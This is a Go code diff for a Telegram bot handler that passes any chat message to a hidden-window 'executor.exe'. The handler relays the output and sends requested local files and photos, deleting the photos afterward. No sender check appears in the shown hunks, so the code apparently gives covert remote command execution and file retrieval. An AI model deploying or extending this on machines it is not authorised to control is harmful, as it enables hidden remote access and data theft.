@@ -44,12 +44,13 @@ func main() {
 		}
 	})
 
-	b.Handle(telebot.OnText, func(c telebot.Context) error {
+b.Handle(telebot.OnText, func(c telebot.Context) error {
 		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
 		defer cancel()
 
 		cmd := exec.CommandContext(ctx, "./executor.exe", c.Text())
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
 		stdout, err := cmd.StdoutPipe()
 		if err != nil {
 			return c.Send("⚠️ ERROR: Internal pipe failure.")
@@ -62,7 +63,6 @@ func main() {
 		scanner := bufio.NewScanner(stdout)
 		var textBuffer strings.Builder
 
-		// Helper to flush the buffer
 		flushBuffer := func() {
 			if textBuffer.Len() > 0 {
 				c.Send(textBuffer.String())
@@ -70,38 +70,52 @@ func main() {
 			}
 		}
 
+		// Read output exactly as it streams in
 		for scanner.Scan() {
-			line := scanner.Text() // Don't trim yet to preserve script formatting
+			line := scanner.Text()
 			cleanLine := strings.TrimSpace(line)
+
+			if cleanLine == "" {
+				continue
+			}
 
 			switch {
 			case strings.HasPrefix(cleanLine, "FILE:"):
-				flushBuffer() // Send any pending text before the file
-				c.Send(&telebot.Document{File: telebot.FromDisk(strings.TrimPrefix(cleanLine, "FILE:"))})
-				
+				flushBuffer()
+				path := strings.TrimSpace(strings.TrimPrefix(cleanLine, "FILE:"))
+				c.Send(&telebot.Document{File: telebot.FromDisk(path)})
+
 			case strings.HasPrefix(cleanLine, "PHOTO:"):
 				flushBuffer()
-				c.Send(&telebot.Photo{File: telebot.FromDisk(strings.TrimPrefix(cleanLine, "PHOTO:"))})
+				path := strings.TrimSpace(strings.TrimPrefix(cleanLine, "PHOTO:"))
 				
+				// Send immediately, then delete if successful
+				if err := c.Send(&telebot.Photo{File: telebot.FromDisk(path)}); err == nil {
+					os.Remove(path)
+				}
+
 			case strings.HasPrefix(cleanLine, "ERROR:"):
 				flushBuffer()
-				c.Send("⚠️ " + strings.TrimPrefix(cleanLine, "ERROR:"))
-				
+				c.Send("⚠️ " + strings.TrimSpace(strings.TrimPrefix(cleanLine, "ERROR:")))
+
 			default:
 				textBuffer.WriteString(line + "\n")
-				// Telegram limit is 4096. Flush if we get close.
-				if textBuffer.Len() >= 4000 {
+				if textBuffer.Len() >= 1000 {
 					flushBuffer()
 				}
 			}
-		} 
+		}
+
+		// CRITICAL: Flush any remaining buffered text after the loop finishes
 		flushBuffer()
 
+		// Wait only after the stdout pipe is fully consumed and closed
 		if err := cmd.Wait(); err != nil {
 			if ctx.Err() == context.DeadlineExceeded {
 				return c.Send("⚠️ ERROR: Command timed out after 5 minutes.")
 			}
 		}
+		
 		return nil
 	})
 
